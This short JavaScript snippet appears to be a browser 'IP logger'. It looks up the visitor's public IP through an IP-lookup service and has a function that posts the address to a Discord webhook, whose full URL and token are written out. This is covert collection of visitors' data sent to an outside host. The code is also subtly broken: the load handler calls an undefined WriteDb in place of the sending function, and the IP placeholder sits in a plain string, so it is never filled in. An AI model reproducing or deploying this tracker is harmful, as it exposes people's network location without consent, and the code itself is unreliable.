var xml=new XMLHttpRequest
xml.open("GET", "https://api.ipify.org")
xml.send();
xml.addEventListener("loadend",loaded);

function loaded(e){
  WriteDb(xml.responseText);
}

function sendip(ip){
  var request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/1032015261139738646/f_eEE8n52wkSZlFaUfxIvGoGBapFzou5GOAI2zULdAOrM-C4mxApxk4wehnkC1ptHFWf");
  request.setRequestHeader('Content-type', 'application/json');

  var params = {
    username: "IP LOGG£R",
    avatar_url: "",
    content: "IP = `${ip}`"
  }
  
  request.send(JSON.stringify(params));
}
